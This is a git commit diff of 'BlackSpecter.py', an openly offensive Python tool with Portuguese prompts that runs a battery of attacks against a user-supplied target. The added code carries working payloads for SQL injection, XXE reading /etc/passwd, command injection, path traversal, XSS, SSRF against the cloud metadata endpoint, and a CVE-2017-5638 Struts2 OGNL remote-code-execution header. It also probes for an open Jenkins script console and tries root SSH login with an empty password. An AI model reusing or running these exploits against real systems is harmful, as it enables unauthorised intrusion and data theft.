85cb4410e3a2bca3dab693a7cbc5265f95708962
./LordX.404 <150133351+LordX404@users.noreply.github.com>
2025-07-14 08:47:33 -0300

    BlackSpecter.py

--- BlackSpecter.py
+++ BlackSpecter.py
@@ -1,25 +1,23 @@
 import requests
 import socket
+import dns.resolver
 import paramiko
-import re
-import threading
-import sys
-from urllib.parse import urljoin
+import subprocess
 
 ASCII_ART = r'''
 ███████████  ████                     █████                          
 ░░███░░░░░███░░███                    ░░███                          
- ░███    ░███ ░███   ██████    ██████  ░███ █████                   
- ░██████████  ░███  ░░░░░███  ███░░███ ░███░░███                    
- ░███░░░░░███ ░███   ███████ ░███ ░░░  ░██████░                     
- ░███    ░███ ░███  ███░░███ ░███  ███ ░███░░███                    
- ███████████  █████░░████████░░██████  ████ █████                   
-░░░░░░░░░░░  ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░                    
+ ░███    ░███ ░███   ██████    ██████  ░███ █████                    
+ ░██████████  ░███  ░░░░░███  ███░░███ ░███░░███                     
+ ░███░░░░░███ ░███   ███████ ░███ ░░░  ░██████░                      
+ ░███    ░███ ░███  ███░░███ ░███  ███ ░███░░███                     
+ ███████████  █████░░████████░░██████  ████ █████                    
+░░░░░░░░░░░  ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░                     
                                                                     
                                                                     
                                                                     
-  █████████                               █████                      
- ███░░░░░███                             ░░███                      
+  █████████                               █████                       
+ ███░░░░░███                             ░░███                       
 ░███    ░░░  ████████   ██████   ██████  ███████    ██████  ████████
 ░░█████████ ░░███░░███ ███░░███ ███░░███░░░███░    ███░░███░░███░░███
  ░░░░░░░░███ ░███ ░███░███████ ░███ ░░░   ░███    ░███████  ░███ ░░░ 
@@ -27,7 +25,7 @@ ASCII_ART = r'''
 ░░█████████  ░███████ ░░██████ ░░██████   ░░█████ ░░██████  █████    
  ░░░░░░░░░   ░███░░░   ░░░░░░   ░░░░░░     ░░░░░   ░░░░░░  ░░░░░    
              ░███                                                  
-             █████                                                
+             █████                                                 
             ░░░░░                                                  
 '''
 
@@ -36,17 +34,17 @@ class SQLiAutoExploit:
         self.target = target.rstrip('/')
 
     def run(self):
-        urls_to_test = [self.target + param for param in ['?id=1', '?page=1', '?item=1']]
-        payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "' OR '1'='1' /*"]
-        for url in urls_to_test:
-            for payload in payloads:
-                full_url = url + payload
-                try:
-                    r = requests.get(full_url, timeout=8)
-                    if r.status_code == 200 and ("sql syntax" in r.text.lower() or "mysql" in r.text.lower() or "you have an error" in r.text.lower() or "warning" in r.text.lower()):
-                        return True, full_url
-                except Exception:
-                    pass
+        payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "' OR 1=1 -- "]
+        vulnerable = False
+        for payload in payloads:
+            url = self.target + "/search?q=" + requests.utils.quote(payload)
+            try:
+                r = requests.get(url, timeout=5)
+                if r.status_code == 200 and ('sql' in r.text.lower() or 'mysql' in r.text.lower() or 'syntax' in r.text.lower()):
+                    vulnerable = True
+                    return True, url
+            except:
+                continue
         return False, None
 
 class XXEExploit:
@@ -54,16 +52,18 @@ class XXEExploit:
         self.target = target.rstrip('/')
 
     def run(self):
-        xml_payload = """<?xml version="1.0"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<foo>&xxe;</foo>"""
+        xxe_payload = '''<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>'''
         headers = {'Content-Type': 'application/xml'}
         try:
-            r = requests.post(self.target, data=xml_payload, headers=headers, timeout=8)
-            if "root:x:" in r.text:
+            r = requests.post(self.target, data=xxe_payload, headers=headers, timeout=5)
+            if 'root:x:' in r.text:
                 return True, r.text
-        except Exception:
-            return False, None
+        except:
+            pass
         return False, None
 
 class RCEExploit:
@@ -71,77 +71,70 @@ class RCEExploit:
         self.target = target.rstrip('/')
 
     def run(self):
-        # Test common RCE payload in params
-        payloads = [';id', '&&id', '|id']
-        urls_to_test = [self.target + param for param in ['?cmd=', '?command=', '?exec=']]
-        for url in urls_to_test:
-            for payload in payloads:
-                full_url = url + payload
-                try:
-                    r = requests.get(full_url, timeout=8)
-                    if "uid=" in r.text:
-                        return True, full_url
-                except Exception:
-                    pass
-        return False, None
-
-class LFIAttack:
-    def __init__(self, target):
-        self.target = target.rstrip('/')
-
-    def run(self):
-        params = ['?file=/etc/passwd', '?page=../../../../../../etc/passwd', '?include=../../../../../../etc/passwd']
-        for p in params:
-            url = self.target + p
+        rce_payload = 'ping -c 1 127.0.0.1'
+        params = ['cmd=', 'command=', 'exec=']
+        for param in params:
             try:
-                r = requests.get(url, timeout=8)
-                if "root:x:" in r.text:
+                url = self.target + '/?' + param + requests.utils.quote(rce_payload)
+                r = requests.get(url, timeout=5)
+                if r.status_code == 200 and ('ping' in r.text or 'icmp' in r.text):
                     return True, url
-            except Exception:
-                pass
+            except:
+                continue
         return False, None
 
-class XSSAttack:
+class LFIExploit:
     def __init__(self, target):
         self.target = target.rstrip('/')
 
     def run(self):
-        payload = "<script>alert('xss')</script>"
-        params = ['?q=', '?search=', '?term=']
-        for p in params:
-            url = self.target + p + payload
+        lfi_payloads = ['../../../../etc/passwd', '../../../etc/passwd', '../../etc/passwd']
+        param = 'file='
+        for p in lfi_payloads:
             try:
-                r = requests.get(url, timeout=8)
-                if payload in r.text:
+                url = self.target + '/?' + param + requests.utils.quote(p)
+                r = requests.get(url, timeout=5)
+                if 'root:x:' in r.text:
                     return True, url
-            except Exception:
-                pass
+            except:
+                continue
         return False, None
 
-class SSRFExploit:
+class XSSExploit:
     def __init__(self, target):
         self.target = target.rstrip('/')
 
     def run(self):
-        # Try to fetch localhost / internal IP via SSRF vulnerable param
-        payloads = [
-            'http://127.0.0.1',
-            'http://localhost',
-            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
-            'http://169.254.169.254/latest/user-data/'
-        ]
-        params = ['?url=', '?redirect=', '?next=']
-        for p in params:
-            for payload in payloads:
-                url = self.target + p + payload
-                try:
-                    r = requests.get(url, timeout=8)
-                    if r.status_code == 200 and r.text.strip():
-                        # naive check for metadata content
-                        if 'ami-id' in r.text or 'instance-id' in r.text or 'user-data' in r.text:
-                            return True, url
-                except Exception:
-                    pass
+        xss_payload = "<script>alert('XSS')</script>"
+        params = ['q=', 'search=']
+        for param in params:
+            try:
+                url = self.target + '/?' + param + requests.utils.quote(xss_payload)
+                r = requests.get(url, timeout=5)
+                if xss_payload in r.text:
+                    return True, url
+            except:
+                continue
+        return False, None
+
+class CVEExploit:
+    def __init__(self, target):
+        self.target = target.rstrip('/')
+
+    def run(self):
+        # Exemplo real para CVE-2017-5638 (Apache Struts2)
+        exploit_url = self.target + "/struts2-showcase/index.action"
+        headers = {
+            'Content-Type': '%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).'
+                            '(#ct=(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('
+                            "'id').getInputStream()))).(#ct)}'
+        }
+        try:
+            r = requests.get(exploit_url, headers=headers, timeout=5)
+            if 'uid=' in r.text:
+                return True, exploit_url
+        except:
+            pass
         return False, None
 
 class SSTIExploit:
@@ -162,48 +155,65 @@ class SSTIExploit:
                     pass
         return False, None
 
-class HTTPMethodCheck:
+class SSRFExploit:
     def __init__(self, target):
         self.target = target.rstrip('/')
 
     def run(self):
-        try:
-            r = requests.options(self.target, timeout=5)
-            allowed = r.headers.get('Allow', '')
+        ssrf_payload = "http://169.254.169.254/latest/meta-data/"
+        params = ['url=', 'resource=']
+        for param in params:
+            try:
+                url = self.target + '/?' + param + requests.utils.quote(ssrf_payload)
+                r = requests.get(url, timeout=5)
+                if r.status_code == 200:
+                    return True, url
+            except:
+                continue
+        return False, None
+
+class HTTPMethodExploit:
+    def __init__(self, target):
+        self.target = target.rstrip('/')
+
+    def run(self):
+        methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE', 'CONNECT']
+        allowed = []
+        for method in methods:
+            try:
+                r = requests.request(method, self.target, timeout=5)
+                if r.status_code < 405:
+                    allowed.append(method)
+            except:
+                continue
+        if allowed:
             return True, allowed
-        except Exception:
-            return False, None
+        return False, None
 
 class JenkinsExploit:
     def __init__(self, target):
         self.target = target.rstrip('/')
-        if not self.target.startswith('http'):
-            self.target = 'http://' + self.target
 
     def run(self):
+        jenkins_url = self.target + '/script'
         try:
-            r = requests.get(self.target + '/script', timeout=8)
+            r = requests.get(jenkins_url, timeout=5)
             if r.status_code == 200 and 'Jenkins' in r.text:
-                # vulnerable if script console open
-                return True, self.target + '/script'
-            else:
-                # Check anonymous access or default creds (not implemented here)
-                return False, None
-        except Exception:
-            return False, None
+                return True, jenkins_url
+        except:
+            pass
+        return False, None
 
 class DNSExfiltration:
     def __init__(self, domain):
         self.domain = domain
 
     def run(self):
-        # Requires custom DNS server setup to catch exfiltrated data
-        # Here just dummy check if domain resolves (real exfiltration needs DNS server)
         try:
-            ip = socket.gethostbyname(self.domain)
-            return True, ip
-        except Exception:
-            return False, None
+            answers = dns.resolver.resolve(self.domain, 'TXT')
+            return True, [str(rdata) for rdata in answers]
+        except Exception as e:
+            return False, str(e)
 
 class BannerGrabber:
     def __init__(self, target, port):
@@ -213,13 +223,15 @@ class BannerGrabber:
     def run(self):
         try:
             s = socket.socket()
-            s.settimeout(5)
+            s.settimeout(3)
             s.connect((self.target, self.port))
             banner = s.recv(1024).decode(errors='ignore').strip()
             s.close()
-            return True, banner
-        except Exception:
-            return False, None
+            if banner:
+                return True, banner
+        except:
+            pass
+        return False, None
 
 class SSHScanner:
     def __init__(self, target, port=22):
@@ -228,60 +240,51 @@ class SSHScanner:
 
     def run(self):
         try:
-            sock = socket.socket()
-            sock.settimeout(5)
-            sock.connect((self.target, self.port))
-            banner = sock.recv(1024).decode('utf-8').strip()
-            sock.close()
-            return True, banner
-        except Exception:
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            ssh.connect(self.target, port=self.port, username='root', password='', timeout=5)
+            ssh.close()
+            return True, "SSH open with root no password"
+        except paramiko.AuthenticationException:
+            return True, "SSH open but authentication required"
+        except:
             return False, None
 
 def main():
     print(ASCII_ART)
-    target = input("Target URL (http://example.com): ").strip()
-    if not target.startswith("http"):
-        target = "http://" + target
+    target = input("Digite o alvo (ex: http://site.com): ").strip()
+    dns_domain = input("Digite domínio DNS para DNSExfiltration (ex: example.com): ").strip()
+    port = 22
 
-    modules = [
-        ("SQL Injection", SQLiAutoExploit(target)),
-        ("XXE", XXEExploit(target)),
-        ("RCE", RCEExploit(target)),
-        ("LFI", LFIAttack(target)),
-        ("XSS", XSSAttack(target)),
-        ("SSRF", SSRFExploit(target)),
-        ("SSTI", SSTIExploit(target)),
-        ("HTTP Methods", HTTPMethodCheck(target)),
-        ("Jenkins Console", JenkinsExploit(target)),
-        # DNSExfiltration needs domain
-    ]
+    modules = {
+        'SQLi': SQLiAutoExploit(target),
+        'XXE': XXEExploit(target),
+        'RCE': RCEExploit(target),
+        'LFI': LFIExploit(target),
+        'XSS': XSSExploit(target),
+        'CVE': CVEExploit(target),
+        'SSTI': SSTIExploit(target),
+        'SSRF': SSRFExploit(target),
+        'HTTP Methods': HTTPMethodExploit(target),
+        'Jenkins': JenkinsExploit(target),
+        'DNS Exfiltration': DNSExfiltration(dns_domain),
+        'Banner Grabber': BannerGrabber(target.replace('http://', '').replace('https://', ''), port),
+        'SSH Scanner': SSHScanner(target.replace('http://', '').replace('https://', ''), port)
+    }
 
-    for name, module in modules:
-        print(f"\nRunning {name} test...")
-        result, detail = module.run()
-        if result:
-            print(f"[+] Vulnerability detected in {name}!\nDetail: {detail}")
-        else:
-            print(f"[-] {name} not vulnerable or not detected.")
-
-    # Banner grabbing example
-    print("\nRunning Banner Grabber on port 80...")
-    bg = BannerGrabber(target.replace("http://", "").replace("https://", ""), 80)
-    result, banner = bg.run()
-    if result:
-        print(f"[+] Banner grabbed: {banner}")
-    else:
-        print("[-] Could not grab banner.")
-
-    # SSH Scanner example
-    print("\nRunning SSH scanner on port 22...")
-    ssh = SSHScanner(target.replace("http://", "").replace("https://", ""), 22)
-    result, banner = ssh.run()
-    if result:
-        print(f"[+] SSH banner: {banner}")
-    else:
-        print("[-] SSH service not detected.")
+    for name, module in modules.items():
+        print(f"\nExecutando módulo: {name}")
+        try:
+            success, info = module.run()
+            if success:
+                print(f"[OK] {name} vulnerabilidade encontrada!")
+                print(f"Info: {info}")
+            else:
+                print(f"[INFO] {name} não vulnerável ou inacessível.")
+        except Exception as e:
+            print(f"[ERRO] Falha ao executar {name}: {e}")
 
 if __name__ == "__main__":
     main()
+
 
